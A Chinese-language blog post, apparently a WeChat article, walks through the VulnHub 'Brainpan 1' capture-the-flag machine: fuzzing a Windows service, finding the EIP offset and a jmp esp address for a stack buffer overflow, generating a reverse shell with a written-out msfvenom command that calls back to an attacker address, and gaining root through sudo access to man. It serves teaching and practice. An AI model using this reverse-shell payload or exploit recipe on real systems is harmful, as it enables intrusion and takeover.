> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5T3OihdyjfWTAJjF8410hQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **22** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/Q6e43UC3v1HiaBRGY9kMxh3tLO1aBBkGyOkLibppRwafQGLWpwuJO8ejicFmygc0xEug5gKuge6miasNIBiaIaiak0iaQ/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/brainpan-1,51/

靶机难度：中级（CTF）

靶机发布日期：2013 年 3 月 20 日

靶机描述：By using this virtual machine, you agree that in no event will I be liable

for any loss or damage including without limitation, indirect or 

consequential loss or damage, or any loss or damage whatsoever arising 

from loss of data or profits arising out of or in connection with the use 

of this software.

目标：得到 root 权限 & 找到 ** 四个 **flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/TLAfQEhpjHSPbp8RvqloqZfhr9oq4s6WqbTll9md0ZdsSxQCd5OvTakCISlraZ8vylH1cV3xQ3X6wE358HPuFQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tgBkzkErby8icMQPXTDEYrRDbV7bGXeq1KrZt21iak9Pfgl9GvX2xZZPQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tcACtSnuvscz5t2xh3GRRx8q9pAalNGicOibJjN4BBkSlcRx62HfCMzUg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.152

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8twicNDjdBThjHDYgrib4Cl0JicVog9uwRKf96HBHLF6lvjagGOAicZgCMYw/640?wx_fmt=png)

开了 9999 和 10000 端口...

这次和前面几篇都不一样...

先来试试 9999 端口

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tlNXtK3fPdRGEGd4BehmTcicjD12p3oe9licIVcQY2DacFFTXofQ1ShWw/640?wx_fmt=png)

拒绝访问... 没密码没办法了... 尝试 10000 端口吧

前面 nmap 给的信息 10000 端口有 http 服务

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tZkwj8tyll6UJickkA6hy3mxcSicsgOA29SnmAF5ON5rWa32eibwU0VicBA/640?wx_fmt=png)

这里主要有关安全编码的 Veracode 信息图，发现了 OWASP 在 Web 应用程序中排名前 10 位的漏洞等等，目前没看到有用的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t4uyBe7WVtNqpxI3GMKDpQAzdOrmHbKQTbybTlJvQmypGOpia2JCSBBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tygBuD3Z4TPlXLwjYdfmicLTCFtFicDIhWLTIulT1I3fVOeojiaQ7QVR1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

发现 / bin 目录，发现特定的 HTTP 服务器和 Python 版本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tN9rDNia94BUtsHqObJDZFicsBgrPVj6MZAicQo78ZGUnDvnghBqic5qlPg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tdXSrYrvM3VJ7EeKOBiaIj3gtgU8IjLuFOkRyUlgQZ7zYermk5paNTjQ/640?wx_fmt=png)

使用 wget 下载 brainpan.exe 文件并使用 file 命令检查该文件，发现它是一个 32 位 Windows 可执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t843VvqEW72N79p8qXG1z0IRSOcqdMpqpkaHNhEJVBefgvauvOW2ffA/640?wx_fmt=png)

在 Windows 机器上执行该应用程序可以发现它是一个网络服务器，正在等待端口 9999 上的连接，很可能找到了正在该端口上监听的应用程序...

下面在本机上用 immunity debugger 打开 brainpan.exe 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8ttwlb1DnHxGiaVtlzx0A3HsLFt3zVJicHAYvy48gTX5MFgyxMxnDdibD2A/640?wx_fmt=png)

运行它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8taH3fUEicjmZvtHkf7WKaPF3AqPPbxhLahs7vVMriaLsNT9SlywJoDKAA/640?wx_fmt=png)

现在创建一个简单的 fuzzer python 脚本，以发送字符串来尝试使程序崩溃...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t2Aql9libNVtcJVrFknWbG54HQN7Uiamtg0EH4O2a4oWjjQHwe4dWE5xw/640?wx_fmt=png)

然后在 kali 上输出到本地 EXE 文件中执行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t5yjmvFWTcYgByn6BKLmK8PkzlQDOEawCVkZLhu6ZicD4cmCheokXAgQ/640?wx_fmt=png)

可以看到 python 脚本中的字符串成功发送，并且触发了访问冲突...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tlRlEXEH7TN6aTPQqrgGWvRAgkJdKxyFRaqTGbdvQZxhzm3p4h8TstA/640?wx_fmt=png)

知道字符串会导致程序崩溃，我想确切地确定它崩溃的位置并覆盖 EIP（在这种情况下，它是 61616161，而 ascii 小写字母'a'是十六进制的，所以它表示 aaaa），在 python 脚本有效负载中替换字符串，插入一串唯一的字符...

要创建一串唯一的字符，需要使用 metasploit 工具 “pattern-create” 来创建一个唯一的 1000 个字符的字符串...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8ticvoxylG9q2UxlVI7JHIibWKo3T2mFudPtX7xsjLLYSEkCibJUuZ8643Q/640?wx_fmt=png)

将其添加到脚本中作为有效负载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tLKfud4LgicSf1SAxjgY92ib496XGZD0kUf9Tp8kEpUjtmUu7TrdF39tg/640?wx_fmt=png)

继续输入

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tkkE87r07HRSGrWbJE8yQ8rXVwNQ3qouwz6pDWb3VbIvQIrxwmicmoog/640?wx_fmt=png)

这次运行它时，确切地看到它崩溃的位置以及用来覆盖 EIP 的内容...

可以看到它用 **35724134** 覆盖了 EIP

知道字符在 1000 个字符的字符串中的某个位置，需要确切的知道它... 使用 metasploit...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tia9ZicnOAYEAqLjvuEHlY1VDTGVzbzF0wIzR3Of8uxgURhib948pcxVfg/640?wx_fmt=png)

在 524 位置，调整下 ptyhon 脚本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tO5ibtqd2NXQNXkAhqrGgEpozHnsnDmhPM1gUharkMjbEOgkEpP5f27Q/640?wx_fmt=png)

继续运行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tSQ7VE4bg2emb8icqYOk3fSdMo0yVc5enHoJW8Cgru2tqncmaicelAN4A/640?wx_fmt=png)

看到 EIP 已被 62626262（bbbb）覆盖了...

将最终用有效载荷中的 c 替换 shellcode...

这边需要注意的是：** 确保增加区域的大小以容纳反向 shell 代码，需要将 c 的数量调整数值 **！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t5N7gLpuNqtNRyZJwYLq2UAczplIFqUmJMbicN9pAXeZw21JjRxibGwWA/640?wx_fmt=png)

右键单击 ESP 寄存器并选择 “follow in dump”，可以看到所有写入内存的'c'字符。起始地址是 005FF910

向下滚动查看，可以看到写'c'的结束地址是 005FFAE8

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tUibWxgoZl1micKZrYL5sd509vIHHuq8NYoibLVtHr2hkCI0GBK0a45hBg/640?wx_fmt=png)

这边我写反了但是意思都知道...（尴尬） 472 个 C

如果这里不够字符来写 shellcode，那得用到 [fuzzysecurity](http://www.fuzzysecurity.com/tutorials/expDev/4.html)！

这边 472 个已经够了...

现在需要检查包含在我的 shellcode 中的 “坏字符”... 我将使用不同字符的字符串....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t7IUIYVmSCo1J3gADAP6QwEacCic97dQ8IpUZHBH9hVQDaU0kgqXacWA/640?wx_fmt=png)

这是一个生成所有字符的简单 python 脚本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8ticlQrupuYVnLIUnbZRJujLgYqf5IYVhZsy8AaWLicicCgEOFn9dN0eAWw/640?wx_fmt=png)

调整 python 脚本有效负载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tYOdJjjJaibb397ONVcF1qjKq4B8rlZ36pRe2j2clicR9chVVXA4vkXvQ/640?wx_fmt=png)

重新运行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tNO483fvicf4eBbSiaZhc1Pox4wJK4RROCJ3SBVZ9QCaavGb87mkgibygA/640?wx_fmt=png)

仔细查看了序列，看不到任何丢失的字符，可以使用所有字符（\ x00 为空字节除外）

需要跳转到堆栈，就需要找到指令 “jmp esp” 的地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tchvQ1yKfDsdYdWxXqZukcQ5gPia3uZg6CIFeQLJgX2JmSsApzq3mEog/640?wx_fmt=png)

```
311712F3...
```

将它添加到我的 Python 脚本中，以替换写入 EIP 的 4 个 “b” 字符（反转需使用小端序格式：\ xF3 \ x12 \ x17 \ x31）

使用 msfvenom 创建我的反向 shell 有效负载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tCjK4JsiaXa6ZWFrDNjRCMfGLQHE8yFkkEV9bP3Vf7BMNBc5EOS4PkcQ/640?wx_fmt=png)

```
msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=192.168.182.149 LPORT=443 -f python
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tiayTZK6hzRwUausPyZlK0mrxWHax97PgQ6G0r2Uwvhbr4u4JMKAP4sQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tKkYSADb5awYHqTo2mcdKaCn4W1WE5tfd3JOj4gO7ScjdVP33EtSQgw/640?wx_fmt=png)

python 中添加了一点小字节的反向 jmp esp 地址，16 个 nops（\ x90），然后是实际的 shellcode...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tZnDzwaMhfU5ZiczGibr3WqNPYnTmPNdhzXta4YrPABucaTFMdQUhDYqg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8twD1tWWoIWtmm9dAHAVsIibiaZo2lvDESmWiaibQReVm3WyicE2FKP3CiabGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8ttVW3zgRcszCsuahln80h88hP3fMSQyONcnz2LUPZapr0raKgGAPXzA/640?wx_fmt=png)

首先在本地测试漏洞，方法是用 wine 启动 brainpan.exe，然后启动服务，看到连接已建立！！

该漏洞利用程序是在靶机上工作的（192.168.182.152），继续测试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tmR0lfYrVptiabULclu7J8CicCqofRIyKm8LhopZrLcOtfERmXRdfxskw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8teiadr48jHkGy9sU6gPEFsmOdbz9tdU9gOvOKWPFCtfDwrX0gLzbE1KQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t9PXeHYDAfl0clzS37YibaNyYJlzjiaWs0a2qeY2TmXX3L8GKpfFvwOXg/640?wx_fmt=png)

成功通过缓冲区提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tZ3zXPJOtI64WGpY5o52NN9xXicAUibnlzB2070YNq8cvtSejjxw0G39Q/640?wx_fmt=png)

直接 sudo 提权，发现 / home/anansi/bin/anansi_util...

继续 sudo 目录试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tarmokDTxuIshQIFt1h0NxyG26HTEPjduRMpYxjK1yLwlbTgXW6XibBg/640?wx_fmt=png)

意思是可以选择一个执行，command 告知我有命令能执行，试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tpxmg53A7ziaRXILran44fbfDlHI5cVwWXGoprQX700eDwe0au2cSsJQ/640?wx_fmt=png)

！进入到 man 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8t6kgq1Vcw3GCHiaQKIaQ09QF8iacmIehicRNuUaoQJHHPM9aTibHHSPTDXQ/640?wx_fmt=png)

该目录全是 root 权限执行的文件...（这里有太多提权的方法，shell 我就不写了，发现已经凌晨 2 点了...)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8teApbR49GT04wKRwLgOUPdCjc59GWeSwjCxicFhzORxaziaYPqJ9a1r2Q/640?wx_fmt=png)

记住，我已经以 sudo（以 root 身份）运行了整个程序，然后如果我输入!/bin/sh，它将在此目录中运行一个 shell… 以 root 身份运行！（记住这个方法，简单省力省时）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNwnUmBaY4LoFYXdRA9gx8tpnkJqSRXz5picBypnoPFlicJ4TnOoATsXcBqDTBXPs6T3PWLicmicicPQRA/640?wx_fmt=png)

成功拿到 root 权限和 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

花了一天的时间来理解缓冲区溢出，栈溢出，二进制，逆向分析！！！！没去接触前，真的很难，只要认真专研下来，理解原理，其实难度还是不大...（哈哈，站着说话不腰疼）

缓冲区溢出调试与漏洞利用编写缓冲区溢出需要了解基础的栈溢出原理、调试方法及 exp 编写方法，属于逆向分析比较基础的程度，但是对于没有逆向分析经验的小伙伴还是需要认真学习下的，加油。

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)